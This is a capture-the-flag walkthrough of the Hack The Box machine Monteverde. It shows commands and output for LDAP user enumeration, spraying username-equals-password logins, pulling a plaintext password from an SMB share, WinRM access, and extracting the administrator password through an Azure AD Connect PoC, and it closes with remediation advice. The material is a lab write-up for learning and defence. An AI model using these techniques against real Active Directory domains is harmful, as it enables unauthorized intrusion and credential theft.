---
title: Monteverde - Walkthrough Only
date: 03-18-2026
tags:
  - HTB
  - Windows
  - Medium
---
![[Monteverde_Machine_Image.png]]
# 🎯 Summary
**Monteverde** is a medium-rated Windows Hack The Box machine that focuses on **Azure AD Connect** and weak credential management in an Active Directory environment. The initial foothold is gained through **domain enumeration** to identify valid users and a **password spraying** attack to reveal valid passwords. After gaining access to internal **SMB shares**, a sensitive configuration file is discovered containing plaintext credentials for a more privileged user. Final escalation to full domain compromise is achieved by exploiting the **Azure AD Connect** service, extracting and decrypting the administrator password though an online POC.

The following tools were utilized to compromise the machine from initial access to Domain Admin:
- [**Nmap**](https://nmap.org): Service Discovery and Port Identification 
- **[NetExec](https://www.netexec.wiki/) / [Smbclient](https://linux.die.net/man/1/smbclient)**: SMB Share Discovery and Interaction
- [**Windapsearch.py**](https://github.com/ropnop/windapsearch/blob/master/windapsearch.py): LDAP Enumeration
- [**BloodHound**](https://specterops.io/bloodhound-community-edition/): Domain Enumeration
- [**Evil-WinRM:**](https://github.com/Hackplayers/evil-winrm) Remote access on the host

# 🔍 Reconnaissance
Our assessment starts with an `Nmap` scan of our target host's externally exposed services:
```
$ nmap -Pn -n -p- -sC -sV 10.129.228.111 -oA Scans/monteverde_all
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 10:00 +0100
Nmap scan report for 10.129.228.111
Host is up (0.020s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-18 09:02:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<SNIP>
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-18T09:03:43
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 216.84 seconds
```

The scan output shows ports **88, 464 (Kerberos)**, ports **139, 445  (SMB)** and ports **389, 636 and 3268 (LDAP)** and **5985 (WinRM)** as open, indicating that the OS is Windows and provide the name of the domain: **MEGABANK.LOCAL**.

We start the enumeration of the target host verifying the presence of SMB shared folders publicly accessible as an **anonymous user**, searching for sensitive files possibly containing credentials, utilizing the `smbclient` tool:
```
$ smbclient -NL //10.129.228.111/                               
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.228.111 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The result of the command leads us to continue our enumeration trying to recover a **domain users list** querying the LDAP service using the `windapsearch.py` Python script:
```
$ python3 windapsearch.py -d megabank.local --dc-ip 10.129.228.111 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.228.111
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=MEGABANK,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 10 users: 

cn: Guest

cn: AAD_987d7f2f57d2

cn: Mike Hope
userPrincipalName: mhope@MEGABANK.LOCAL

cn: SABatchJobs
userPrincipalName: SABatchJobs@MEGABANK.LOCAL

cn: svc-ata
userPrincipalName: svc-ata@MEGABANK.LOCAL

cn: svc-bexec
userPrincipalName: svc-bexec@MEGABANK.LOCAL

cn: svc-netapp
userPrincipalName: svc-netapp@MEGABANK.LOCAL

cn: Dimitris Galanos
userPrincipalName: dgalanos@MEGABANK.LOCAL

cn: Ray O'Leary
userPrincipalName: roleary@MEGABANK.LOCAL

cn: Sally Morgan
userPrincipalName: smorgan@MEGABANK.LOCAL


[*] Bye!
```

To be able to use this usernames list we have to clean the command output removing all the "**noise**" and keeping only the usernames without the "@MEGABANK.LOCAL" part.
As the first step we proceed to save the output in a file named "users" and next, utilizing a second file (users2), we proceed to remove the undesired characters with the `cut` tool:
```
$ cat users | cut -d ":" -f 2 > users2
$ cat users2 | cut -d "@" -f 1 > users
$ cat users                           
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

Having a clean list of usernames, we proceed to verify if any of them have the attribute "**UF_DONT_REQUIRE_PREAUTH**" set utilizing the `Impacket's GetNPUsers` tool; in  case a user has the attribute set, it could be possible to execute an **ASREPRoasting attack** to retrieve its Ticket Granting Ticket (**TGT**):
```
$ impacket-GetNPUsers -dc-ip 10.129.228.111 -usersfile users megabank.local/ -no-pass     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**None** of the users have the attribute set so we need to continue our enumeration looking for a valid password.
After checking all exposed services, we verify if any account has its password **identical** to the username with `NetExec`: to do it we provide the same "users" file both as "-u" and "-p" flags attribute:
```
─$ nxc smb 10.129.228.111 -u users -p users                                                              
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
<SNIP>
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```

The output confirms that the account **SABatchJobs** has the username set as its password.
# ⚔️ Exploitation
Having obtained **valid credentials**, we return to our enumeration process verifying if the SABatchJobs account can access SMB shared folders and with which **privileges**:
```
$ nxc smb 10.129.228.111 -u SABatchJobs -p SABatchJobs --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ
```

The "**users$**" share is the only one non-standard and where we have **READ** privileges, so we proceed to explore its content looking for sensitive information and discover the "**azure.xml**" file under the "**mhope**" folder:
```
$ smbclient //10.129.228.111/users$ -U SABatchJobs
Password for [WORKGROUP\SABatchJobs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> ls dgalanos\
  .                                   D        0  Fri Jan  3 14:12:30 2020
  ..                                  D        0  Fri Jan  3 14:12:30 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> ls mhope\
  .                                   D        0  Fri Jan  3 14:41:18 2020
  ..                                  D        0  Fri Jan  3 14:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> ls roleary\
  .                                   D        0  Fri Jan  3 14:10:30 2020
  ..                                  D        0  Fri Jan  3 14:10:30 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> ls smorgan\
  .                                   D        0  Fri Jan  3 14:10:24 2020
  ..                                  D        0  Fri Jan  3 14:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> cd mhope\
smb: \mhope\> get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (12,2 KiloBytes/sec) (average 12,2 KiloBytes/sec)
```

After downloading the file, we proceed to open it finding a **password** that seems to be associated with the **mhope account**:
```
$ cat azure.xml                                                    
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4nxxxxxxxxxxxxxxr$</S>
    </Props>
  </Obj>
</Objs>
```

To verify the validity of the password we utilize the `NetExec` tool testing it with the SMB service:
```
$ nxc smb 10.129.228.111 -u mhope -p '4nxxxxxxxxxxxxxxr$'          
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4nxxxxxxxxxxxxxxr$
```

The output confirms that the credentials **are valid** so we try to obtain a PowerShell terminal on the target host utilizing the `Evil-WinRM` tool:
```
─$ evil-winrm -i 10.129.228.111 -u "mhope" -p '4nxxxxxxxxxxxxxxr$'                                   
                                        
<SNIP>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami
megabank\mhope
*Evil-WinRM* PS C:\Users\mhope\Documents> hostname
MONTEVERDE
```
# 🚩 Post-Exploitation
Exploring the filesystem we discover under the "C:\Users\mhope\Desktop" path the **user.txt** file, the first machine flag, revealing its content:
```
*Evil-WinRM* PS C:\Users\mhope\Documents> ls ..\Desktop


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/18/2026   1:02 AM             34 user.txt


*Evil-WinRM* PS C:\Users\mhope\Documents> type ..\Desktop\user.txt
64c1xxxxxxxxxxxxxxxxxxxxxxxxe8ab
```

Our interest shifts to **compromising the Administrator** account to take full control over the target host.
As our next step we proceed to execute `BloodHound-Python` to automatically enumerate the domain taking advantage of the mhope account's credentials:
```
$ bloodhound-python -u "mhope" -p '4nxxxxxxxxxxxxxxr$' -ns 10.129.228.111 -d megabank.local -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: megabank.local
<SNIP>
INFO: Found 13 users
INFO: Found 65 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MONTEVERDE.MEGABANK.LOCAL
INFO: Done in 00M 05S
```

As usual we add all the tool-generated output JSON files to a single ZIP archive to load them simultaneously in our `BloodHound` instance:
```
$ zip -r monteverde_domain *.json 
  adding: 20260318112456_computers.json (deflated 75%)
  adding: 20260318112456_containers.json (deflated 93%)
  adding: 20260318112456_domains.json (deflated 76%)
  adding: 20260318112456_gpos.json (deflated 85%)
  adding: 20260318112456_groups.json (deflated 95%)
  adding: 20260318112456_ous.json (deflated 92%)
  adding: 20260318112456_users.json (deflated 94%)
```

Completed this step, we proceed starting the `BloodHound` instance and loading the ZIP archive:
```
$ sudo bloodhound                                 
[sudo] password di luca: 

 Starting neo4j
Neo4j is not running.
<SNIP>
```

With all the data loaded we check the information gathered about the mhope account and discover that it is a member of the "**AZURE ADMINS**" group:
![[mhope_groups_membership.png]]

Going back to our `Evil-WinRM` session we verify if Azure is installed on the system and discover the presence of the  **Azure AD Connect** program:
```
*Evil-WinRM* PS C:\Users\mhope\Documents> ls "C:\Program Files\"


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   9:36 PM                Common Files
d-----         1/2/2020   2:46 PM                internet explorer
d-----         1/2/2020   2:38 PM                Microsoft Analysis Services
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
d-----         1/2/2020   2:38 PM                Microsoft SQL Server
d-----         1/2/2020   2:25 PM                Microsoft Visual Studio 10.0
d-----         1/2/2020   2:32 PM                Microsoft.NET
<SNIP>
```

This information and the "**AAD_987d7f2f57d2**" account discovered earlier are clear **hints** that we have to try to escalate our privileges abusing the Azure AD service.
Searching online, we identify a [technical article](https://blog.xpnsec.com/azuread-connect-for-redteam/) where a POC is provided to extract the **ADSync account** password that can be used to take control of the target host.
We utilize the built in function of `Evil-WinRM` to upload the POC on the target host and execute it:
```
*Evil-WinRM* PS C:\Users\mhope\Documents> upload script.ps1
                                        
Info: Uploading /home/luca/Pentest/Monteverde/Evidence/script.ps1 to C:\Users\mhope\Documents\script.ps1
                                        
Data: 2300 bytes of 2300 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\mhope\Documents> .\script.ps1
                                        
Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: <f:WSManFault Code='1726' Machine='10.129.228.111' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>The WSMan provider host process did not return a proper response.  A provider in the host process may have behaved improperly. </f:Message></f:WSManFault>                                                                                                   
                                        
Error: Exiting with code 1
```

Executing the POC results in the `Evil-WinRM` **session crashing** due to an error generated by the script execution.
After researching online about the code powering the POC, we discover that it is required to modify the first line of the script replacing the argument section from "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync" to "Server=localhost;Database=ADSync;Trusted_Connection=true" to avoid the `Evil-WinRM` sessions crash issue.
Uploading through `Evil-WinRM` the modified script and executing it, this time it results in **obtaining** the user and its relative password in **clear text**:
```
*Evil-WinRM* PS C:\Users\mhope\Documents> upload script.ps1
                                        
Info: Uploading /home/luca/Pentest/Monteverde/Evidence/script.ps1 to C:\Users\mhope\Documents\script.ps1
                                        
Data: 2324 bytes of 2324 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\mhope\Documents> .\script.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: dxxxxxxxxxxxxxx!
```

Having the **Administrator account** password we can access the target host impersonating it and explore the filesystem:
```
$ evil-winrm -i 10.129.228.111 -u "administrator" -p 'dxxxxxxxxxxxxxx!'
                                        
<SNIP>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
MONTEVERDE
```

During our recon we find that the last flag is stored in the **root.txt** file under the "C:\Users\Administrator\Desktop" path and revealing its content, we confirm **full compromise** of the machine:
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..\Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/18/2026   1:02 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
10e4xxxxxxxxxxxxxxxxxxxxxxxxc949
```

# 🛠️ Remediation
## 1. Identity Security & Password Policy
- **Prevent Weak Credentials**: Implement a **Fine-Grained Password Policy (FGPP)** to enforce complexity and prevent "Username = Password" scenarios, which allowed the initial compromise of the `SABatchJobs` account.
- **Password Spraying Defense**: Enable **Account Lockout Policies** to detect and block automated password spraying attempts. Configure alerts for multiple `STATUS_LOGON_FAILURE` events originating from a single internal IP

## 2. SMB Share & Sensitive Data Protection
- **Apply Principle of Least Privilege (PoLP)**: Review permissions on non-standard shares like `users$`. Ensure that users can only access their own home directories and that sensitive configuration files (like `azure.xml`) are not readable by the `Domain Users` group.
- **Secrets Scanning**: Implement automated scanning tools to periodically check internal SMB shares and local filesystems for plaintext credentials, XML configuration files, or scripts containing hardcoded API keys and passwords.

## 3. Azure AD Connect (ADSync) Hardening
- **Restrict Privileged Group Membership**: Audit the **Azure Admins** group. Ensure that only a minimal number of highly trusted accounts are members, as membership in this group often provides a direct path to extracting the ADSync service account credentials.
- **Use Group Managed Service Accounts (gMSA)**: Transition the Azure AD Connect service to use a **gMSA**. This eliminates the risk of password extraction from the local database, as Windows automatically manages and rotates the complex password for the service.
- **Isolate ADSync Infrastructure**: Treat the server hosting Azure AD Connect as a **Tier 0** asset. Restrict RDP and WinRM access to this server to prevent mid-privileged users (like `mhope`) from executing local decryption scripts.

## 4. LDAP Service Hardening
- **Disable Anonymous LDAP Binds**: Configure the Domain Controller to reject anonymous LDAP queries. This prevents unauthenticated attackers from enumerating the entire domain user list, which was the first step in our reconnaissance phase.
- **Require LDAP Signing**: Enforce **LDAP Server Signing** and **LDAP Channel Binding** to protect directory queries from interception and relay attacks.



